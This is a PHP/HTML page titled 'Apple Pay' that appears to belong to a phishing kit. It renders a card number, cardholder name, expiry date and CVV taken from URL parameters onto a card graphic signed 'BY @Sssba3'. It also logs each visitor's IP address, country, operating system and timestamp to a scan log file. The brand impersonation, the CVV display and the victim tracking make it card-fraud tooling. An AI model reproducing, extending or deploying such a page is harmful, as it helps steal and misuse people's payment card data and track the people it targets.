<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="">
    <title>Apple Pay</title>
    <link rel="stylesheet" media="screen" href="./files/css/stye.css">

    <meta name="referrer" content="no-referrer">
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            font-family: Montserrat, Helvetica, sans-serif;
            font-size: 14px;
            background-color: #fff;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        main {
            display: flex;
            align-items: center;
            height: 50vh;
            justify-content: center;
        }

        .card-container {
            perspective: 1000px;
            width: 400px;
            height: 250px;
        }

        .card {
            width: 100%;
            height: 100%;
            border-radius: 15px;
            position: relative;
            transform-style: preserve-3d;
            transition: transform 0.8s;
        }

        .card:hover {
            transform: rotateY(180deg);
        }

        .front,
        .back {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 15px;
            backface-visibility: hidden;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
        }

        .front {
            background: linear-gradient(to right, rgb(17, 17, 17), rgb(85, 85, 85));
            color: white;
        }

        .back {
            background: rgb(158, 158, 158);
            transform: rotateY(180deg);
        }

        .investor {
            position: absolute;
            top: 30px;
            left: 25px;
            text-transform: uppercase;
        }

        .chip {
            position: absolute;
            top: 60px;
            left: 25px;
            width: 50px;
            height: 40px;
            border-radius: 5px;
            background: linear-gradient(to left bottom, rgb(255, 236, 199), rgb(208, 185, 120));
        }

        .card-number {
            position: absolute;
            top: 120px;
            left: 25px;
            font-size: 1.2em;
        }

        .card-holder {
            position: absolute;
            bottom: 40px;
            left: 25px;
            text-transform: uppercase;
        }

        .end {
            position: absolute;
            bottom: 41px;
            left: 140px;
            text-transform: uppercase;
        }

        .master {
            position: absolute;
            right: 20px;
            bottom: 20px;
            display: flex;
        }

        .master .circle {
            width: 25px;
            height: 25px;
            border-radius: 50%;
        }

        .master .master-red {
            background-color: rgb(235, 0, 27);
        }

        .master .master-yellow {
            margin-left: -10px;
            background-color: rgba(255, 209, 0, 0.7);
        }

        .back .strip-black {
            position: absolute;
            top: 30px;
            width: 100%;
            height: 50px;
            background: black;
        }

        .back .ccv {
            position: absolute;
            top: 110px;
            left: 25px;
            right: 25px;
            height: 36px;
            background: white;
            text-align: right;
            line-height: 36px;
            font-size: 1.2em;
            padding-right: 10px;
            color: black;
            border-radius: 5px;
        }

        .back .terms {
            position: absolute;
            bottom: 20px;
            left: 20px;
            right: 20px;
            font-size: 0.8em;
            text-align: justify;
        }
    </style>
</head>

<body>
    <div id="particles-js" style="color: aliceblue; position: relative;">
        <main>
            <div class="card-container">
                <div class="card">
                    <div class="front">
                        <div class="investor">BY @Sssba3 🪢</div>
                        <div class="chip"></div>
                        <div class="card-number">
                            <?php
                            if (!empty($_GET["cc-number"])) {
                                $card = str_replace(" ", "", $_GET["cc-number"]);
                                $card = chunk_split($card, 4, ' '); 
                                echo htmlspecialchars(trim($card)); 
                            }
                            ?>
                        </div>
                        <div class="card-holder">
                            <?php
                            if (!empty($_GET["fname"])) {
                                echo htmlspecialchars($_GET["fname"]);
                            } else {
                                echo "Cardholder Name";
                            }
                            ?>
                        </div>
                        <div class="end">
                            <?php
                            if (!empty($_GET["cc-exp"])) {
                                echo htmlspecialchars($_GET["cc-exp"]);
                            }
                            ?>
                        </div>
                        <div class="master">
                            <div class="circle master-red"></div>
                            <div class="circle master-yellow"></div>
                        </div>
                    </div>

                    <div class="back">
                        <div class="strip-black"></div>
                        <div class="ccv">
                            <label>CCV</label>
                            <?php
                            if (!empty($_GET["cc-cvv"])) {
                                echo htmlspecialchars($_GET["cc-cvv"]);
                            }
                            ?>
                        </div>
                        <div class="terms">
                            <p>This card is the property of its issuing institution. Unauthorized use is prohibited. If found, please return it to the issuing institution or the nearest bank.</p>
                        </div>
                    </div>
                </div>
            </div>
        </main>
        <script src="particles.js"></script>
        <script src="app.js"></script>
    </div>

    <?php
    session_start();
    include "config.php";
    include "functions.php";


    $user_ip = getClientIP();
    $user_os = getOS();
    $user_country_code = getCountryCode();
    $timestamp = getCurrentTimestamp();

    $log_message = "SCAN: IP " . $user_ip . ", Country: " . $user_country_code . ", OS: " . $user_os . ", Time: " . $timestamp;
    appendToFile('scan_log.txt', $log_message);

    echo "Scan logged.";
    ?>
</body>

</html>
